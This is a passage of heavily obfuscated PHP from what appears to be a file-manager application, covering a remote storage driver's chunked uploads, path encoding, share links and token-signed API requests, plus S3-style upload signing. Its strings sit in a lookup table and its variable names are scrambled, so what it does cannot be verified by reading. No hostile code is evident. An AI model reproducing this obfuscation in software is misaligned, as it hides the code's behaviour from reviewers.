$this->uploadChunkSize) { return $this->request($°ıùµ»[108], array($Æµ¿¬‚±, $ŞÓš, $°Ù­˜ğ)); } $Æø±‚šŞ = $this->uploadHashCheck($Æµ¿¬‚±, $ŞÓš, $°Ù­˜ğ); if ($Æø±‚šŞ) { return $Æø±‚šŞ; } $‰—¥Ù»¶ = @filesize($ŞÓš); $·‰Ö·úÖ = $this->uploadChunkSize; $ÔÂ‡÷’Ø = ceil($‰—¥Ù»¶ / $·‰Ö·úÖ); $ƒØàêÜ = 0; while ($ƒØàêÜ < $ÔÂ‡÷’Ø) { $ê­Øòµ = IO::fileSubstr($ŞÓš, $ƒØàêÜ * $·‰Ö·úÖ, $·‰Ö·úÖ); $¥ÉŠÅñş = $this->tempFile($°ıùµ»[12], $ê­Øòµ); $Û„½øĞª = array($°ıùµ»[79] => $‰—¥Ù»¶, $°ıùµ»[1524] => $·‰Ö·úÖ, $°ıùµ»[1525] => $ÔÂ‡÷’Ø, $°ıùµ»[1526] => $ƒØàêÜ); $üú„›á = $this->uploadSend($Æµ¿¬‚±, $¥ÉŠÅñş, $Û„½øĞª, $°Ù­˜ğ); $ƒØàêÜ++; if (!$üú„›á) { return !1; } } if (!is_array($üú„›á) || empty($üú„›á[$°ıùµ»[603]])) { return !1; } return $this->pathApiDecode($üú„›á[$°ıùµ»[603]]); } private function uploadHashCheck($ãšš·§”, $¸Ğéşµæ, $§Æê°õ–) { $ş Øæå =& $_SERVER[‘ÆÜ‘œ]; $‹Â¬ˆÂæ = IO::hashSimple($¸Ğéşµæ); $ßÇŸè³Ñ = array($ş Øæå[1527] => $ş Øæå[1528], $ş Øæå[1486] => $‹Â¬ˆÂæ); $ì¿÷Š§Ÿ = $this->uploadSend($ãšš·§”, $ş Øæå[12], $ßÇŸè³Ñ, $§Æê°õ–); $ªŸƒ”ßÂ = _get($ì¿÷Š§Ÿ, $ş Øæå[603], array()); $Ø÷ÚÖØ = _get($ªŸƒ”ßÂ, $ş Øæå[1529]); if (!is_array($Ø÷ÚÖØ) || !$Ø÷ÚÖØ[$ş Øæå[571]]) { return !1; } $–ô™Êüõ = IO::hashMd5($¸Ğéşµæ); if ($Ø÷ÚÖØ[$ş Øæå[571]] != $–ô™Êüõ) { return !1; } if ($ì¿÷Š§Ÿ[$ş Øæå[603]][$ş Øæå[1530]]) { $this->uploadChunkSize = $ì¿÷Š§Ÿ[$ş Øæå[603]][$ş Øæå[1530]]; } $ßÇŸè³Ñ = array($ş Øæå[1527] => $ş Øæå[1531], $ş Øæå[1487] => $–ô™Êüõ, $ş Øæå[1486] => $‹Â¬ˆÂæ); $ì¿÷Š§Ÿ = $this->uploadSend($ãšš·§”, $ş Øæå[12], $ßÇŸè³Ñ, $§Æê°õ–); if (!is_array($ì¿÷Š§Ÿ) || empty($ì¿÷Š§Ÿ[$ş Øæå[603]])) { return !1; } return $this->pathApiDecode($ì¿÷Š§Ÿ[$ş Øæå[603]]); } private function uploadSend($ÈÉ­Ô€ï, $ŞéËÂ¥¼, $Á¦Ÿ„û, $µÊ…ª±ô = '') { $ü¾•ìî¬ =& $_SERVER[‘ÆÜ‘œ]; $Á¦Ÿ„û[$ü¾•ìî¬[32]] = get_path_this($ÈÉ­Ô€ï); $Á¦Ÿ„û[$ü¾•ìî¬[87]] = $this->pathApiEncode(get_path_father($ÈÉ­Ô€ï)); if ($µÊ…ª±ô) { $Á¦Ÿ„û[$ü¾•ìî¬[1532]] = $µÊ…ª±ô; } if ($ŞéËÂ¥¼) { $Á¦Ÿ„û[$ü¾•ìî¬[231]] = $ü¾•ìî¬[1347] . $ŞéËÂ¥¼; } return $this->requestSend($ü¾•ìî¬[1522], $Á¦Ÿ„û); } protected function pathApiEncode($ÍÒé äî) { $€îÆ°œ =& $_SERVER[‘ÆÜ‘œ]; $ÍĞ¤­ó = $this->_config[$€îÆ°œ[1505]]; $ÅÈ’ ±ë = strlen($ÍĞ¤­ó); if (substr($ÍÒé äî, 0, $ÅÈ’ ±ë) == $ÍĞ¤­ó) { return $ÍÒé äî; } return $ÍĞ¤­ó . ltrim($ÍÒé äî, $€îÆ°œ[8]); } protected function pathApiDecode($•ÌÍ¡ÙÃ) { $ë§¥ÚÄ¸ =& $_SERVER[‘ÆÜ‘œ]; $õÇ§“ä» = $this->_config[$ë§¥ÚÄ¸[1505]]; $®‚Éç„í = strlen($õÇ§“ä»); if (substr($•ÌÍ¡ÙÃ, 0, $®‚Éç„í) !== $õÇ§“ä») { return $•ÌÍ¡ÙÃ; } return $this->_config[$ë§¥ÚÄ¸[1305]] . ltrim(substr($•ÌÍ¡ÙÃ, $®‚Éç„í), $ë§¥ÚÄ¸[8]); } private function pathInfoParse(&$ò¿ÇáÅû) { $¨»’ÕÃ” =& $_SERVER[‘ÆÜ‘œ]; $É³ÛúÜì = $this->_config; $¨º•Â„½ = $É³ÛúÜì[$¨»’ÕÃ”[584]]; if (!$ò¿ÇáÅû || !is_array($ò¿ÇáÅû)) { return $ò¿ÇáÅû; } static $šŠ¸Š¥€ = array(); $óšªÃÎ = $šŠ¸Š¥€[$¨º•Â„½[$¨»’ÕÃ”[695]]]; if (!is_array($óšªÃÎ)) { $…•—¦È¡ = LNG($¨»’ÕÃ”[1533]); $†Ú«¾ã¼ = $É³ÛúÜì[$¨»’ÕÃ”[588]][$¨»’ÕÃ”[90]]; $ğª½™°» = parse_url($É³ÛúÜì[$¨»’ÕÃ”[588]][$¨»’ÕÃ”[1534]]); $±íæØ¨¥ = $É³ÛúÜì[$¨»’ÕÃ”[588]][$¨»’ÕÃ”[1535]]; $óšªÃÎ = array($¨»’ÕÃ”[1536] => $†Ú«¾ã¼[$¨»’ÕÃ”[32]] . $¨»’ÕÃ”[1018] . $±íæØ¨¥ . $¨»’ÕÃ”[1347] . $ğª½™°»[$¨»’ÕÃ”[207]] . $¨»’ÕÃ”[1020], $¨»’ÕÃ”[1537] => $…•—¦È¡ . $¨»’ÕÃ”[1084] . $É³ÛúÜì[$¨»’ÕÃ”[588]][$¨»’ÕÃ”[1534]] . $¨»’ÕÃ”[1538] . LNG($¨»’ÕÃ”[1539]) . $¨»’ÕÃ”[1084] . $±íæØ¨¥, $¨»’ÕÃ”[1540] => LNG($¨»’ÕÃ”[1541]) . $¨»’ÕÃ”[1542] . $É³ÛúÜì[$¨»’ÕÃ”[588]][$¨»’ÕÃ”[1534]] . $¨»’ÕÃ”[286] . LNG($¨»’ÕÃ”[1543]) . $¨»’ÕÃ”[1542] . $†Ú«¾ã¼[$¨»’ÕÃ”[610]], $¨»’ÕÃ”[1535] => array($¨»’ÕÃ”[32] => $±íæØ¨¥, $¨»’ÕÃ”[1544] => $¨»’ÕÃ”[1545]), $¨»’ÕÃ”[1546] => Action($¨»’ÕÃ”[1491])->shareTargetMake($¨º•Â„½[$¨»’ÕÃ”[1502]])); $šŠ¸Š¥€[$¨º•Â„½[$¨»’ÕÃ”[695]]] = $óšªÃÎ; } unset($ò¿ÇáÅû[$¨»’ÕÃ”[192]]); unset($ò¿ÇáÅû[$¨»’ÕÃ”[612]]); unset($ò¿ÇáÅû[$¨»’ÕÃ”[189]]); unset($ò¿ÇáÅû[$¨»’ÕÃ”[597]]); $ò¿ÇáÅû[$¨»’ÕÃ”[1547]] = !0; $ò¿ÇáÅû[$¨»’ÕÃ”[233]] = $É³ÛúÜì[$¨»’ÕÃ”[1509]]; $ò¿ÇáÅû[$¨»’ÕÃ”[234]] = $É³ÛúÜì[$¨»’ÕÃ”[1510]]; $ò¿ÇáÅû[$¨»’ÕÃ”[510]] = $É³ÛúÜì[$¨»’ÕÃ”[1507]]; $ò¿ÇáÅû[$¨»’ÕÃ”[1535]] = $óšªÃÎ[$¨»’ÕÃ”[1535]]; $ò¿ÇáÅû[$¨»’ÕÃ”[1548]] = $¨º•Â„½[$¨»’ÕÃ”[232]]; $ò¿ÇáÅû[$¨»’ÕÃ”[1549]] = $¨º•Â„½[$¨»’ÕÃ”[88]]; $ò¿ÇáÅû[$¨»’ÕÃ”[1550]] = $óšªÃÎ[$¨»’ÕÃ”[1540]]; $ò¿ÇáÅû[$¨»’ÕÃ”[1546]] = $óšªÃÎ[$¨»’ÕÃ”[1546]]; $õÄ”­¡ = explode($¨»’ÕÃ”[8], trim($ò¿ÇáÅû[$¨»’ÕÃ”[610]], $¨»’ÕÃ”[8])); $õÄ”­¡[0] = $óšªÃÎ[$¨»’ÕÃ”[1536]]; $ò¿ÇáÅû[$¨»’ÕÃ”[610]] = implode($¨»’ÕÃ”[8], $õÄ”­¡); if (count($õÄ”­¡) > 1) { unset($ò¿ÇáÅû[$¨»’ÕÃ”[1546]]); } if (count($õÄ”­¡) == 1) { if ($ò¿ÇáÅû[$¨»’ÕÃ”[33]] == $¨»’ÕÃ”[78]) { $ò¿ÇáÅû[$¨»’ÕÃ”[32]] = $óšªÃÎ[$¨»’ÕÃ”[1536]]; } array_set_value($ò¿ÇáÅû, $¨»’ÕÃ”[1551], $óšªÃÎ[$¨»’ÕÃ”[1537]]); } $ñµ³¹‹ä = array($¨»’ÕÃ”[1552], $¨»’ÕÃ”[1471], $¨»’ÕÃ”[1553], $¨»’ÕÃ”[1554]); foreach ($ñµ³¹‹ä as $“¥È¼†) { $î×ğù÷© = $this->urlAuto(_get($ò¿ÇáÅû, $“¥È¼†, $¨»’ÕÃ”[12])); if ($î×ğù÷©) { array_set_value($ò¿ÇáÅû, $“¥È¼†, $î×ğù÷©); } } } private function _info($¯Ğ«¦Î¬, $Ê³ˆø³È = false) { $ÄÂÊÔ¿¶ =& $_SERVER[‘ÆÜ‘œ]; $«±şı¼Ó = $this->_config; if (!$«±şı¼Ó) { return !1; } static $ı»‡ï€ = array(); if (isset($ı»‡ï€[$¯Ğ«¦Î¬]) && is_array($ı»‡ï€[$¯Ğ«¦Î¬])) { return $ı»‡ï€[$¯Ğ«¦Î¬]; } if ((!$¯Ğ«¦Î¬ || !trim($¯Ğ«¦Î¬, $ÄÂÊÔ¿¶[8])) && !$Ê³ˆø³È) { $Ã¢á»ù = $«±şı¼Ó[$ÄÂÊÔ¿¶[588]][$ÄÂÊÔ¿¶[90]]; if (!$Ã¢á»ù) { return !1; } $Ã¢á»ù[$ÄÂÊÔ¿¶[610]] = $ÄÂÊÔ¿¶[12]; $Ã¢á»ù[$ÄÂÊÔ¿¶[87]] = $«±şı¼Ó[$ÄÂÊÔ¿¶[1305]]; $this->pathInfoParse($Ã¢á»ù); return $Ã¢á»ù; } $ÙˆÔŞÛæ = $this->request($ÄÂÊÔ¿¶[1555], array($¯Ğ«¦Î¬, $Ê³ˆø³È)); $ı»‡ï€[$¯Ğ«¦Î¬] = $ÙˆÔŞÛæ; return $ÙˆÔŞÛæ; } private function _fileSubstr($¾ĞúŞŸ‚, $ÆÇÜäøî = 0, $„ë¾›Š‹ = -1) { $×•Ññ˜‡ =& $_SERVER[‘ÆÜ‘œ]; $ªÀü¹ô = $this->_fileLink($¾ĞúŞŸ‚); if (!$ªÀü¹ô) { return !1; } $”â€’ˆ = !1; if ($„ë¾›Š‹ > 0) { $÷ ¡ÉÄ = $ıƒ±û½ğ + $„ë¾›Š‹ - 1; $”â€’ˆ = array($×•Ññ˜‡[1556] . $ıƒ±û½ğ . $×•Ññ˜‡[485] . $÷ ¡ÉÄ); } $¾˜±¥ = url_request($ªÀü¹ô, $×•Ññ˜‡[1557], !1, $”â€’ˆ); return $¾˜±¥[$×•Ññ˜‡[857]] ? $¾˜±¥[$×•Ññ˜‡[1341]] : !1; } private function _download($í¬»¼¥, $Ş•à÷‘—) { $çİµäØ˜ = $this->_fileLink($í¬»¼¥); if (!$çİµäØ˜) { return !1; } Downloader::start($çİµäØ˜, $Ş•à÷‘—); return $Ş•à÷‘—; } private function _fileLink($—Ôİ©Ë©, $’è™û×å = '') { $‹ãÄ»µæ =& $_SERVER[‘ÆÜ‘œ]; $¸›‡‰Íó = $this->pathApiEncode($—Ôİ©Ë©); return $this->requestMakeUrl($‹ãÄ»µæ[1558], array($‹ãÄ»µæ[87] => $¸›‡‰Íó)) . $’è™û×å; } private function urlAuto($ÎÌ«‘İ) { $–€²â =& $_SERVER[‘ÆÜ‘œ]; if (!$ÎÌ«‘İ) { return $ÎÌ«‘İ; } $ÚÈ¾ÓºÌ = parse_url($ÎÌ«‘İ); $Õçö’ ³ = $ÎÌ«‘İ; if ($this->_config[$–€²â[1508]] && $ÚÈ¾ÓºÌ[$–€²â[206]] == $–€²â[150] && Input::check($ÚÈ¾ÓºÌ[$–€²â[1559]], $–€²â[1560])) { $ÎÌ«‘İ = $–€²â[218] . substr($ÎÌ«‘İ, 7); } $‹¢ŒôÑ = $–€²â[1561] . rawurlencode(rtrim($this->config[$–€²â[1505]], $–€²â[8])); if (strstr($ÎÌ«‘İ, $‹¢ŒôÑ)) { $»•ï¦˜Ç = strstr($ÎÌ«‘İ, $–€²â[76]) ? $–€²â[285] : $–€²â[76]; $ÎÌ«‘İ = $ÎÌ«‘İ . $»•ï¦˜Ç . $–€²â[1562] . $this->authToken; } return $ÎÌ«‘İ; } private function request($èµ€Ğ¸Ù, $ü’Û’îõ) { $»ÙÇÏˆ =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($ü’Û’îõ)) { $ü’Û’îõ = array(); } for ($³Ø·–ÆÌ = 0; $³Ø·–ÆÌ < 4; $³Ø·–ÆÌ++) { if (!isset($ü’Û’îõ[$³Ø·–ÆÌ])) { $ü’Û’îõ[$³Ø·–ÆÌ] = $»ÙÇÏˆ[12]; } } $š‘Ääïç = array($»ÙÇÏˆ[1555] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1555], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[1565], $»ÙÇÏˆ[1566] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[1567] => array(array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])), $»ÙÇÏˆ[1568] => $ü’Û’îõ[1] ? $»ÙÇÏˆ[91] : $»ÙÇÏˆ[12])), $»ÙÇÏˆ[1517] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1569], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1566] => $»ÙÇÏˆ[1570], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])), $»ÙÇÏˆ[1571] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1572], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1566] => $»ÙÇÏˆ[1573], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])), $»ÙÇÏˆ[1518] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1574], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[1576], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0], $»ÙÇÏˆ[169] => $ü’Û’îõ[1])), $»ÙÇÏˆ[1494] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1494], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[603], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0], $»ÙÇÏˆ[169] => $ü’Û’îõ[1], $»ÙÇÏˆ[1532] => $ü’Û’îõ[2])), $»ÙÇÏˆ[1495] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1495], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[603], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0], $»ÙÇÏˆ[1532] => $ü’Û’îõ[2])), $»ÙÇÏˆ[649] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1577], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[1578], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[1579], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[1567] => array(array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])), $»ÙÇÏˆ[87] => $ü’Û’îõ[1], $»ÙÇÏˆ[1532] => $ü’Û’îõ[2])), $»ÙÇÏˆ[651] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1580], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[1578], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[1579], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[1567] => array(array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])), $»ÙÇÏˆ[87] => $ü’Û’îõ[1], $»ÙÇÏˆ[1532] => $ü’Û’îõ[2])), $»ÙÇÏˆ[1282] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1581], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[1565], $»ÙÇÏˆ[1566] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[1567] => array(array($»ÙÇÏˆ[87] => $ü’Û’îõ[0])))), $»ÙÇÏˆ[1498] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1582], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[603], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => $ü’Û’îõ[0], $»ÙÇÏˆ[1583] => $ü’Û’îõ[1])), $»ÙÇÏˆ[108] => array($»ÙÇÏˆ[1563] => $»ÙÇÏˆ[1522], $»ÙÇÏˆ[1564] => $»ÙÇÏˆ[87], $»ÙÇÏˆ[1575] => $»ÙÇÏˆ[603], $»ÙÇÏˆ[1304] => array($»ÙÇÏˆ[87] => get_path_father($ü’Û’îõ[0]), $»ÙÇÏˆ[231] => $ü’Û’îõ[1] ? $»ÙÇÏˆ[1347] . $ü’Û’îõ[1] : $»ÙÇÏˆ[12], $»ÙÇÏˆ[32] => get_path_this($ü’Û’îõ[0]), $»ÙÇÏˆ[1532] => $ü’Û’îõ[2]))); $ŠÑ„“° = $š‘Ääïç[$èµ€Ğ¸Ù]; if (!$ŠÑ„“°) { return !1; } $—ŒÍºåÏ = $ŠÑ„“°[$»ÙÇÏˆ[1304]]; $æÙÒ‚¥ = explode($»ÙÇÏˆ[50], $ŠÑ„“°[$»ÙÇÏˆ[1564]]); foreach ($æÙÒ‚¥ as $¢äÈÂè†) { $æ·¦Ú‚Â = $this->pathApiEncode(_get($—ŒÍºåÏ, $¢äÈÂè†)); array_set_value($—ŒÍºåÏ, $¢äÈÂè†, $æ·¦Ú‚Â); } if ($èµ€Ğ¸Ù == $»ÙÇÏˆ[1498] && trim($ŠÑ„“°[$»ÙÇÏˆ[1304]][$»ÙÇÏˆ[87]], $»ÙÇÏˆ[8]) == trim($this->_config[$»ÙÇÏˆ[1305]], $»ÙÇÏˆ[8])) { return $ŠÑ„“°[$»ÙÇÏˆ[1304]][$»ÙÇÏˆ[87]]; } $¶®Öß¼Š = $this->requestSend($ŠÑ„“°[$»ÙÇÏˆ[1563]], $—ŒÍºåÏ); if (!$¶®Öß¼Š) { return !1; } $ÓèÉóğ = $¶®Öß¼Š[$»ÙÇÏˆ[1341]]; if ($ŠÑ„“°[$»ÙÇÏˆ[1575]]) { $ÓèÉóğ = _get($¶®Öß¼Š, $ŠÑ„“°[$»ÙÇÏˆ[1575]]); } if (is_string($ÓèÉóğ) && !$ŠÑ„“°[$»ÙÇÏˆ[1566]]) { return $this->pathApiDecode($ÓèÉóğ); } if (!is_array($ÓèÉóğ) || !$ÓèÉóğ) { return $ÓèÉóğ; } $ËÙÁ¾¢ó = explode($»ÙÇÏˆ[50], $ŠÑ„“°[$»ÙÇÏˆ[1566]]); foreach ($ËÙÁ¾¢ó as $¢äÈÂè†) { $—áü†ğ = explode($»ÙÇÏˆ[10], $¢äÈÂè†); $ÃÀË‹™¿ = array_search($»ÙÇÏˆ[1584], $—áü†ğ); if ($ÃÀË‹™¿ === !1) { $æ·¦Ú‚Â = $this->pathApiDecode(_get($ÓèÉóğ, $¢äÈÂè†)); array_set_value($ÓèÉóğ, $¢äÈÂè†, $æ·¦Ú‚Â); if ($èµ€Ğ¸Ù == $»ÙÇÏˆ[1555] && $¢äÈÂè† == $»ÙÇÏˆ[87]) { $this->pathInfoParse($ÓèÉóğ); } if ($èµ€Ğ¸Ù == $»ÙÇÏˆ[1517] && $¢äÈÂè† == $»ÙÇÏˆ[1585]) { $this->pathInfoParse($ÓèÉóğ[$»ÙÇÏˆ[1492]]); } if ($èµ€Ğ¸Ù == $»ÙÇÏˆ[1517]) { $ÓèÉóğ[$»ÙÇÏˆ[1586]] = array(); } continue; } $Ó²È™Ş† = implode($»ÙÇÏˆ[10], array_slice($—áü†ğ, $ÃÀË‹™¿ + 1)); $×ß«ù€ = array(); if ($ÃÀË‹™¿ === 0) { $×ß«ù€ =& $ÓèÉóğ; } if ($ÃÀË‹™¿ === 1) { $×ß«ù€ =& $ÓèÉóğ[$—áü†ğ[0]]; } if ($ÃÀË‹™¿ === 2) { $×ß«ù€ =& $ÓèÉóğ[$—áü†ğ[0]][$—áü†ğ[1]]; } foreach ($×ß«ù€ as $¢äÈÂè† => $ëÑ¢Ÿ) { $æ·¦Ú‚Â = $this->pathApiDecode(_get($ëÑ¢Ÿ, $Ó²È™Ş†)); array_set_value($×ß«ù€[$¢äÈÂè†], $Ó²È™Ş†, $æ·¦Ú‚Â); $this->pathInfoParse($×ß«ù€[$¢äÈÂè†]); } unset($×ß«ù€); } return $ÓèÉóğ; } private function requestMakeUrl($û—÷£İí, $è½ÔÇÀı = '') { $¢…¹Ì„ó =& $_SERVER[‘ÆÜ‘œ]; $Ü¤êŒï = $this->_config; if (!$this->authToken) { return !1; } $äîù»Ú = $this->requestQuery($è½ÔÇÀı, !0) . $¢…¹Ì„ó[1587] . $this->authToken; $«¿ÄÃ‹ = rtrim($Ü¤êŒï[$¢…¹Ì„ó[588]][$¢…¹Ì„ó[1534]], $¢…¹Ì„ó[8]) . $¢…¹Ì„ó[1588] . $û—÷£İí; return $«¿ÄÃ‹ . $¢…¹Ì„ó[1589] . rawurlencode($Ü¤êŒï[$¢…¹Ì„ó[588]][$¢…¹Ì„ó[1506]]) . $äîù»Ú; } private function requestAuthToken() { $ª©Öä‰ş =& $_SERVER[‘ÆÜ‘œ]; $ô¬úĞï = $this->_config; if (!$ô¬úĞï) { return !1; } $”²ÖÍ„§ = _get($ô¬úĞï, $ª©Öä‰ş[1590]); $ùøõä¼ó = array_find_by_field($ô¬úĞï[$ª©Öä‰ş[588]][$ª©Öä‰ş[1546]], $ª©Öä‰ş[1591], $”²ÖÍ„§); if (!$ùøõä¼ó) { return !1; } $øáÇ—Ë = $ùøõä¼ó[$ª©Öä‰ş[1592]] . $ª©Öä‰ş[1593] . $ùøõä¼ó[$ª©Öä‰ş[1295]]; $¶÷ïº‘ñ = $ª©Öä‰ş[1594] . $this->pathParse[$ª©Öä‰ş[495]] . $ª©Öä‰ş[485] . $øáÇ—Ë; $ÀË·Êîó = Cache::get($¶÷ïº‘ñ); if ($ÀË·Êîó) { return $ÀË·Êîó; } $ÀË·Êîó = Mcrypt::encode($øáÇ—Ë, $ª©Öä‰ş[1595]); Cache::set($¶÷ïº‘ñ, $ÀË·Êîó, 3600 * 24 * 60); return $ÀË·Êîó; } private function requestQuery($´˜²Ş¤ = '', $ùê›ßŒ = false) { if (!$´˜²Ş¤ || !is_array($´˜²Ş¤)) { return $´˜²Ş¤; } foreach ($´˜²Ş¤ as $›Ğ¼ü˜ => $ŞÌøÍñø) { if (is_array($ŞÌøÍñø)) { $´˜²Ş¤[$›Ğ¼ü˜] = json_encode($ŞÌøÍñø); } } return $ùê›ßŒ ? $_SERVER[‘ÆÜ‘œ][285] . http_build_query($´˜²Ş¤) : $´˜²Ş¤; } private function requestSend($Ò•â·ÜÆ, $»–óì„•) { $„û‹»†Ä =& $_SERVER[‘ÆÜ‘œ]; $¼»½ÀÇƒ = $this->requestMakeUrl($Ò•â·ÜÆ); if (!$¼»½ÀÇƒ) { return !1; } $ªà™¥êç = url_request($¼»½ÀÇƒ, $„û‹»†Ä[289], $this->requestQuery($»–óì„•), !1, !1, !0); $Ûòä¤¨Ş = $ªà™¥êç[$„û‹»†Ä[1341]]; if (!is_array($Ûòä¤¨Ş) || !$Ûòä¤¨Ş || !$Ûòä¤¨Ş[$„û‹»†Ä[1351]] || intval($Ûòä¤¨Ş[$„û‹»†Ä[1351]]) > 500) { $¡›²ãüÚ = is_array($Ûòä¤¨Ş) ? $Ûòä¤¨Ş[$„û‹»†Ä[1341]] : $Ûòä¤¨Ş . $„û‹»†Ä[12]; if (!$ªà™¥êç[$„û‹»†Ä[857]]) { $¡›²ãüÚ .= $„û‹»†Ä[1596] . $ªà™¥êç[$„û‹»†Ä[1351]] . $„û‹»†Ä[176]; } IO::errorTips($¡›²ãüÚ, !1); return !1; } return $Ûòä¤¨Ş; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¶ÍÈèÊ) { parent::__construct($¶ÍÈèÊ); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ëŸÈ•ˆò) { parent::__construct($ëŸÈ•ˆò); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } public function uploadFormData($Õ’”²Š, $³ÌÆÍ = 3600) { $åÕß’çĞ =& $_SERVER[‘ÆÜ‘œ]; $âëñô´ü = $åÕß’çĞ[230]; $ÃÉÕÔˆ = $åÕß’çĞ[258]; $ÏÜ«Ã¢î = $åÕß’çĞ[62]; $š–†¼º = gmdate($åÕß’çĞ[259]); $É‚’Íª = gmdate($åÕß’çĞ[260]); $×û‰°¢ = $åÕß’çĞ[261]; $ìšãÂË† = $³ÌÆÍ . $åÕß’çĞ[12]; $Â³Š×± = $åÕß’çĞ[262]; $‚õè¨È = array($this->accessKey, $É‚’Íª, $this->region, $ÏÜ«Ã¢î, $×û‰°¢); $ƒù²öƒ = implode($åÕß’çĞ[8], $‚õè¨È); $æ›«•Şà = array($åÕß’çĞ[263] => gmdate($åÕß’çĞ[1476], strtotime($åÕß’çĞ[265])), $åÕß’çĞ[266] => array(array($åÕß’çĞ[267] => $this->bucket), array($åÕß’çĞ[307] => $âëñô´ü), array($åÕß’çĞ[268], $åÕß’çĞ[269], $åÕß’çĞ[12]), array($åÕß’çĞ[268], $åÕß’çĞ[270], $åÕß’çĞ[12]), array($åÕß’çĞ[268], $åÕß’çĞ[308], $åÕß’çĞ[12]), array($åÕß’çĞ[271] => $Â³Š×±), array($åÕß’çĞ[272] => $ƒù²öƒ), array($åÕß’çĞ[273] => $ÃÉÕÔˆ), array($åÕß’çĞ[274] => $š–†¼º), array($åÕß’çĞ[275] => $ìšãÂË†))); $“êÎ²– = base64_encode(json_encode($æ›«•Şà)); $çÊ³¦ = hash_hmac($åÕß’çĞ[276], $É‚’Íª, $åÕß’çĞ[277] . $this->secret, !0); $Š…œ‚Áß = hash_hmac($åÕß’çĞ[276], $this->region, $çÊ³¦, !0); $ôİå¯İ— = hash_hmac($åÕß’çĞ[276], $ÏÜ«Ã¢î, $Š…œ‚Áß, !0); $Ôš—­ï³ = hash_hmac($åÕß’çĞ[276], $×û‰°¢, $ôİå¯İ—, !0); $¾Ñ¢´â = hash_hmac($åÕß’çĞ[276], $“êÎ²–, $Ôš—­ï³); $Àœòö‰¿ = array($åÕß’çĞ[247] => $åÕß’çĞ[12], $åÕß’çĞ[295] => $åÕß’çĞ[12], $åÕß’çĞ[307] => $âëñô´ü, $åÕß’çĞ[271] => $Â³Š×±, $åÕß’çĞ[278] => $“êÎ²–, $åÕß’çĞ[309] => $ƒù²öƒ, $åÕß’çĞ[310] => $ÃÉÕÔˆ, $åÕß’çĞ[311] => $š–†¼º, $åÕß’çĞ[312] => $ìšãÂË†, $åÕß’çĞ[313] => $¾Ñ¢´â, $åÕß’çĞ[207] => $this->getHost()); return $Àœòö‰¿; } } goto D•šÊƒÃÓ¯; F·ƒÄùÀè£: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\151\x6d\145", "\x74\151\155\145", "\151\156\163\145\x72\x74\54\165\x70\144\141\164\x65", "\146\165\x6e\143\x74\x69\x6f\156"), array("\x63\162\145\x61\164\145\x54\151\x6d\145", "\164\151\155\145", "\x69\x6e\163\145\162\164", "\x66\x75\156\143\x74\151\x6f\156"), array("\x6f\x70\164\151\157\156\163", '', "\x69\156\163\x65\x72\x74\54\165\x70\x64\x61\x74\145\x2c\163\x65\x6c\145\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ìÍÎÒœ¯) { $¢€ÜåÖ =& $_SERVER[‘ÆÜ‘œ]; return array($¢€ÜåÖ[2275] => array(USER_ID, $¢€ÜåÖ[2276]), $¢€ÜåÖ[2277] => array($ìÍÎÒœ¯[0], $¢€ÜåÖ[2278])); } protected function ___listSimple() { $–®¯°À— = $this->field($this->fieldList)->where(array($_SERVER[‘ÆÜ‘œ][1544] => USER_ID))->select(); return $–®¯°À— ? $–®¯°À— : array(); } protected function ___getInfoShare($¥ÆÊ÷) { return $this->_getShareInfo(array($_SERVER[‘ÆÜ‘œ][695] => $¥ÆÊ÷), !1); } protected function getInfo($ŠÉåŞáí) { $øÚ³»Ä’ = $this->getInfoShare($ŠÉåŞáí); return $this->shareSourceInfo($øÚ³»Ä’); } public function 